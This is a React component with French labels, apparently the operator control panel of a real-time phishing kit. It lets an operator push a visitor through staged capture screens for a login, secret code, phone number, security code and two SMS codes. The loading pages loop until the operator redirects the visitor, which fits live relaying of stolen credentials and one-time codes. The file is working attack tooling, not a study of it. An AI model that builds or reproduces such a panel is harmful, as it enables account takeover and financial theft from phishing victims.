import React, { useState, useEffect } from 'react';
import { Settings, Users, ArrowRight, RotateCcw } from 'lucide-react';

interface AdminPanelProps {
  currentStep: string;
  onStepChange: (step: string) => void;
  userCount: number;
}

export default function AdminPanel({ currentStep, onStepChange, userCount }: AdminPanelProps) {
  const [isVisible, setIsVisible] = useState(false);
  const [selectedStep, setSelectedStep] = useState(currentStep);

  const steps = [
    { id: 'login', label: 'Connexion initiale' },
    { id: 'code', label: 'Code secret' },
    { id: 'loading1', label: 'Chargement 1' },
    { id: 'phone', label: 'Numéro téléphone' },
    { id: 'loading2', label: 'Chargement 2' },
    { id: 'security', label: 'Code sécurité' },
    { id: 'loading3', label: 'Chargement 3' },
    { id: 'sms1', label: 'Premier SMS' },
    { id: 'loading4', label: 'Chargement 4' },
    { id: 'sms2', label: 'Deuxième SMS' },
    { id: 'loading5', label: 'Chargement 5' },
    { id: 'success', label: 'Succès' }
  ];

  useEffect(() => {
    setSelectedStep(currentStep);
  }, [currentStep]);

  const handleStepChange = () => {
    onStepChange(selectedStep);
  };

  const resetToLogin = () => {
    onStepChange('login');
    setSelectedStep('login');
  };

  return (
    <>
      {/* Bouton flottant pour ouvrir le panneau */}
      <button
        onClick={() => setIsVisible(!isVisible)}
        style={{
          position: 'fixed',
          top: '20px',
          right: '20px',
          width: '50px',
          height: '50px',
          borderRadius: '50%',
          border: 'none',
          background: '#2d5a3d',
          color: 'white',
          cursor: 'pointer',
          zIndex: 1001,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          boxShadow: '0 4px 12px rgba(0,0,0,0.3)'
        }}
      >
        <Settings size={24} />
      </button>

      {/* Panneau d'administration */}
      {isVisible && (
        <div style={{
          position: 'fixed',
          top: '0',
          right: '0',
          width: '350px',
          height: '100vh',
          background: 'white',
          boxShadow: '-4px 0 12px rgba(0,0,0,0.3)',
          zIndex: 1000,
          padding: '20px',
          overflowY: 'auto'
        }}>
          <div style={{ marginBottom: '20px', borderBottom: '2px solid #f0f0f0', paddingBottom: '15px' }}>
            <h2 style={{ margin: '0 0 10px 0', color: '#2d5a3d', fontSize: '20px' }}>
              Panneau Admin
            </h2>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#666' }}>
              <Users size={16} />
              <span style={{ fontSize: '14px' }}>Utilisateurs actifs: {userCount}</span>
            </div>
          </div>

          <div style={{ marginBottom: '20px' }}>
            <h3 style={{ margin: '0 0 15px 0', color: '#333', fontSize: '16px' }}>
              Étape actuelle: {steps.find(s => s.id === currentStep)?.label}
            </h3>
            
            <div style={{ 
              padding: '10px', 
              background: '#f8f9fa', 
              borderRadius: '6px',
              border: '2px solid #2d5a3d',
              fontSize: '14px',
              fontWeight: 'bold',
              color: '#2d5a3d'
            }}>
              {currentStep}
            </div>
          </div>

          <div style={{ marginBottom: '20px' }}>
            <h3 style={{ margin: '0 0 15px 0', color: '#333', fontSize: '16px' }}>
              Rediriger vers:
            </h3>
            
            <select 
              value={selectedStep}
              onChange={(e) => setSelectedStep(e.target.value)}
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '6px',
                fontSize: '14px',
                marginBottom: '15px'
              }}
            >
              {steps.map(step => (
                <option key={step.id} value={step.id}>
                  {step.label}
                </option>
              ))}
            </select>

            <button
              onClick={handleStepChange}
              style={{
                width: '100%',
                padding: '12px',
                background: '#2d5a3d',
                color: 'white',
                border: 'none',
                borderRadius: '6px',
                cursor: 'pointer',
                fontSize: '14px',
                fontWeight: 'bold',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                marginBottom: '10px'
              }}
            >
              <ArrowRight size={16} />
              Rediriger maintenant
            </button>

            <button
              onClick={resetToLogin}
              style={{
                width: '100%',
                padding: '12px',
                background: '#dc3545',
                color: 'white',
                border: 'none',
                borderRadius: '6px',
                cursor: 'pointer',
                fontSize: '14px',
                fontWeight: 'bold',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px'
              }}
            >
              <RotateCcw size={16} />
              Recommencer
            </button>
          </div>

          <div style={{ 
            padding: '15px', 
            background: '#fff3cd', 
            border: '1px solid #ffeaa7',
            borderRadius: '6px',
            fontSize: '12px',
            color: '#856404'
          }}>
            <strong>Instructions:</strong><br />
            • Sélectionnez l'étape souhaitée<br />
            • Cliquez sur "Rediriger maintenant"<br />
            • Les pages de chargement restent en boucle jusqu'à redirection manuelle
          </div>
        </div>
      )}
    </>
  );
}